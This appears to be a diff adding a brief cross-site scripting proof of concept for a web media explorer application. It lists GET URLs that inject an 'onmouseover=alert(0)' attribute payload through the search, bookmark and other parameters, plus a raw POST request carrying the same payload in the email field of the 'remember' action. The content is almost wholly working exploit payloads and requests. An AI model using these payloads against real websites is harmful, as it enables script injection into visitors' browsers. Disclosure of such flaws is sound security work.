@@ -1,0 +1,20 @@
+http://www.example.com/webmediaexpl/htdocs/index.php?search=&quot; onmouseover=alert(0) ---
+http://www.example.com/webmediaexpl/htdocs/?view=2&amp;thisisnotarealcall=&#039;)&quot; onmouseover=alert(0) &gt; ---
+http://www.example.com/webmediaexpl/htdocs/index.php?dir=&amp;bookmark=&quot; onmouseover=alert(0) &gt; ---&amp;action=edit
+
+POST Method - Cross Site Scripting:
+Host: [HOST]
+User-Agent: FireFox-3-RoXx
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-us,en;q=0.5
+Accept-Encoding: gzip,deflate
+Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
+Keep-Alive: 300
+Connection: keep-alive
+Referer:
+http://[HOST]/webmediaexpl/htdocs/index.php?action=remember
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 58
+
+Post Content:
+email=%22+onmouseover%3Dalert%280%29+%3E+---&amp;captcha_code=
